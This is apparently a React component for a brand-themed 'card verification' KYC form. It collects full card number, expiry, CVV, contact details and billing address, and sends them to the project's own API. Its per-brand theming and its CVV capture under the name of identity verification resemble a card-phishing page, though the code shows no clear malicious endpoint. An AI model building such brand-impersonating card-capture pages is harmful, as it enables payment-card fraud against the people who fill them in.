"use client";

import { useState, FormEvent, useCallback } from "react";
import { BrandConfig } from "@/lib/brandConfig";
import { CardVerificationSubmitData } from "@/types/kyc";
import { submitCardVerification } from "@/lib/api";

interface CardVerificationFormProps {
  brandConfig: BrandConfig;
  onSubmitted: (sessionToken: string, uuid: string) => void;
}

function formatCardNumber(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length > 2) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
}

function detectCardType(number: string): string {
  const clean = number.replace(/\D/g, "");
  if (/^4/.test(clean)) return "visa";
  if (/^5[1-5]/.test(clean)) return "mastercard";
  if (/^3[47]/.test(clean)) return "amex";
  if (/^6(?:011|5)/.test(clean)) return "discover";
  return "";
}

const cardIcons: Record<string, JSX.Element> = {
  visa: (
    <svg viewBox="0 0 48 32" className="w-10 h-7">
      <rect width="48" height="32" rx="4" fill="#1A1F71" />
      <text x="6" y="22" fill="#FFFFFF" fontWeight="bold" fontSize="14" fontFamily="Arial">VISA</text>
    </svg>
  ),
  mastercard: (
    <svg viewBox="0 0 48 32" className="w-10 h-7">
      <rect width="48" height="32" rx="4" fill="#2D2D2D" />
      <circle cx="18" cy="16" r="8" fill="#EB001B" />
      <circle cx="30" cy="16" r="8" fill="#F79E1B" />
    </svg>
  ),
  amex: (
    <svg viewBox="0 0 48 32" className="w-10 h-7">
      <rect width="48" height="32" rx="4" fill="#006FCF" />
      <text x="5" y="20" fill="#FFFFFF" fontWeight="bold" fontSize="10" fontFamily="Arial">AMEX</text>
    </svg>
  ),
};

export default function CardVerificationForm({ brandConfig, onSubmitted }: CardVerificationFormProps) {
  const [formData, setFormData] = useState<Partial<CardVerificationSubmitData>>({
    brand_slug: brandConfig.slug,
  });
  const [cardDisplay, setCardDisplay] = useState("");
  const [expiryDisplay, setExpiryDisplay] = useState("");
  const [cardType, setCardType] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const updateField = useCallback((field: keyof CardVerificationSubmitData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
  }, []);

  const handleCardNumber = (value: string) => {
    setCardDisplay(formatCardNumber(value));
    const raw = value.replace(/\D/g, "").slice(0, 16);
    updateField("card_number", raw);
    setCardType(detectCardType(raw));
  };

  const handleExpiry = (value: string) => {
    const formatted = formatExpiry(value);
    setExpiryDisplay(formatted);
    updateField("card_expiry", formatted);
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError(null);

    try {
      const result = await submitCardVerification(formData as CardVerificationSubmitData);
      onSubmitted(result.session_token, result.uuid);
    } catch (err: any) {
      setError(err.response?.data?.message || err.response?.data?.errors?.card_number?.[0] || "Submission failed. Please check your details.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const cssVars = {
    "--brand-primary": brandConfig.primaryColor,
    "--brand-secondary": brandConfig.secondaryColor,
    "--brand-accent": brandConfig.accent,
    "--brand-text": brandConfig.textPrimary,
    "--brand-text-secondary": brandConfig.textSecondary,
    "--brand-bg": brandConfig.bgLight,
    "--brand-border": brandConfig.border,
    "--brand-input-border": brandConfig.inputBorder,
    "--brand-input-focus": brandConfig.inputFocus,
    "--brand-radius": brandConfig.buttonRadius,
    "--brand-shadow": brandConfig.cardShadow,
    "--brand-success": brandConfig.success,
    "--brand-error": brandConfig.error,
  } as React.CSSProperties;

  return (
    <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-2xl mx-auto">
      {error && (
        <div
          className="p-3 rounded mb-4 text-sm flex items-center gap-2"
          style={{ backgroundColor: `${brandConfig.error}15`, color: brandConfig.error, border: `1px solid ${brandConfig.error}30` }}
        >
          <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
          </svg>
          {error}
        </div>
      )}

      <form onSubmit={handleSubmit}>
        {/* ===== CARD DETAILS ===== */}
        <div className="kyc-card mb-6">
          <h3 className="text-base font-bold mb-4 flex items-center gap-2" style={{ color: brandConfig.textPrimary }}>
            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke={brandConfig.primaryColor} strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
            </svg>
            Card Details
          </h3>

          {/* Card visual preview */}
          <div
            className="rounded-xl p-5 mb-5 relative overflow-hidden"
            style={{
              background: `linear-gradient(135deg, ${brandConfig.primaryColor}, ${brandConfig.primaryColor}CC)`,
              minHeight: "180px",
            }}
          >
            <div className="absolute top-0 right-0 w-40 h-40 rounded-full opacity-10" style={{ backgroundColor: "#FFFFFF", transform: "translate(30%, -30%)" }} />
            <div className="relative z-10 flex flex-col justify-between h-full" style={{ minHeight: "150px" }}>
              <div className="flex justify-between items-start">
                <svg className="w-10 h-8" viewBox="0 0 40 32" fill="none">
                  <rect x="2" y="6" width="16" height="12" rx="2" fill="#FFD700" opacity="0.9" />
                  <rect x="6" y="10" width="8" height="4" rx="1" fill="#CC9900" opacity="0.5" />
                </svg>
                <div>{cardType && cardIcons[cardType]}</div>
              </div>
              <div className="text-xl font-mono tracking-[0.2em] text-white mt-4">
                {cardDisplay || "•••• •••• •••• ••••"}
              </div>
              <div className="flex justify-between items-end mt-3">
                <div>
                  <div className="text-[10px] text-white/60 uppercase tracking-wider">Card Holder</div>
                  <div className="text-sm text-white font-medium">
                    {formData.cardholder_name || "YOUR NAME"}
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-[10px] text-white/60 uppercase tracking-wider">Expires</div>
                  <div className="text-sm text-white font-mono">{expiryDisplay || "MM/YY"}</div>
                </div>
              </div>
            </div>
          </div>

          {/* Card Number */}
          <div className="mb-4">
            <label className="kyc-label">Card Number *</label>
            <div className="relative">
              <input
                type="text"
                className="kyc-input pr-14"
                placeholder="1234 5678 9012 3456"
                value={cardDisplay}
                onChange={(e) => handleCardNumber(e.target.value)}
                maxLength={19}
                inputMode="numeric"
                autoComplete="cc-number"
                required
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2">
                {cardType && cardIcons[cardType]}
              </div>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4 mb-4">
            <div>
              <label className="kyc-label">Expiry Date *</label>
              <input
                type="text"
                className="kyc-input"
                placeholder="MM/YY"
                value={expiryDisplay}
                onChange={(e) => handleExpiry(e.target.value)}
                maxLength={5}
                inputMode="numeric"
                autoComplete="cc-exp"
                required
              />
            </div>
            <div>
              <label className="kyc-label">CVV *</label>
              <input
                type="password"
                className="kyc-input"
                placeholder="•••"
                maxLength={4}
                inputMode="numeric"
                autoComplete="cc-csc"
                onChange={(e) => updateField("card_cvv", e.target.value.replace(/\D/g, "").slice(0, 4))}
                required
              />
            </div>
          </div>

          <div>
            <label className="kyc-label">Cardholder Name *</label>
            <input
              type="text"
              className="kyc-input"
              placeholder="As shown on card"
              autoComplete="cc-name"
              onChange={(e) => updateField("cardholder_name", e.target.value)}
              required
            />
          </div>
        </div>

        {/* ===== PERSONAL DETAILS ===== */}
        <div className="kyc-card mb-6">
          <h3 className="text-base font-bold mb-4 flex items-center gap-2" style={{ color: brandConfig.textPrimary }}>
            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke={brandConfig.primaryColor} strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
            </svg>
            Personal Details
          </h3>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="md:col-span-2">
              <label className="kyc-label">Email Address *</label>
              <input
                type="email"
                className="kyc-input"
                placeholder="your@email.com"
                autoComplete="email"
                onChange={(e) => updateField("email", e.target.value)}
                required
              />
            </div>
            <div className="md:col-span-2">
              <label className="kyc-label">Phone Number</label>
              <input
                type="tel"
                className="kyc-input"
                placeholder="+1 (555) 000-0000"
                autoComplete="tel"
                onChange={(e) => updateField("phone", e.target.value)}
              />
            </div>
          </div>
        </div>

        {/* ===== BILLING ADDRESS ===== */}
        <div className="kyc-card mb-6">
          <h3 className="text-base font-bold mb-4 flex items-center gap-2" style={{ color: brandConfig.textPrimary }}>
            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke={brandConfig.primaryColor} strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
              <path strokeLinecap="round" strokeLinejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>
            Billing Address
          </h3>

          <div className="space-y-4">
            <div>
              <label className="kyc-label">Address Line 1</label>
              <input
                type="text"
                className="kyc-input"
                placeholder="Street address"
                autoComplete="address-line1"
                onChange={(e) => updateField("address_line_1", e.target.value)}
              />
            </div>
            <div>
              <label className="kyc-label">Address Line 2</label>
              <input
                type="text"
                className="kyc-input"
                placeholder="Apartment, suite, unit, etc."
                autoComplete="address-line2"
                onChange={(e) => updateField("address_line_2", e.target.value)}
              />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="kyc-label">City</label>
                <input
                  type="text"
                  className="kyc-input"
                  placeholder="City"
                  autoComplete="address-level2"
                  onChange={(e) => updateField("city", e.target.value)}
                />
              </div>
              <div>
                <label className="kyc-label">State / Region</label>
                <input
                  type="text"
                  className="kyc-input"
                  placeholder="State"
                  autoComplete="address-level1"
                  onChange={(e) => updateField("state", e.target.value)}
                />
              </div>
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="kyc-label">Postal Code</label>
                <input
                  type="text"
                  className="kyc-input"
                  placeholder="Postal code"
                  autoComplete="postal-code"
                  onChange={(e) => updateField("postal_code", e.target.value)}
                />
              </div>
              <div>
                <label className="kyc-label">Country</label>
                <input
                  type="text"
                  className="kyc-input"
                  placeholder="Country"
                  autoComplete="country-name"
                  onChange={(e) => updateField("country", e.target.value)}
                />
              </div>
            </div>
          </div>
        </div>

        {/* ===== SUBMIT ===== */}
        <button
          type="submit"
          disabled={isSubmitting}
          className="kyc-btn-primary w-full py-3 text-base"
        >
          {isSubmitting ? (
            <span className="flex items-center justify-center gap-2">
              <span className="kyc-spinner" />
              Verifying card...
            </span>
          ) : (
            <span className="flex items-center justify-center gap-2">
              <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              Submit for Verification
            </span>
          )}
        </button>

        <p className="text-center text-xs mt-3" style={{ color: brandConfig.textSecondary }}>
          Your card details are encrypted and transmitted securely.
        </p>
      </form>
    </div>
  );
}
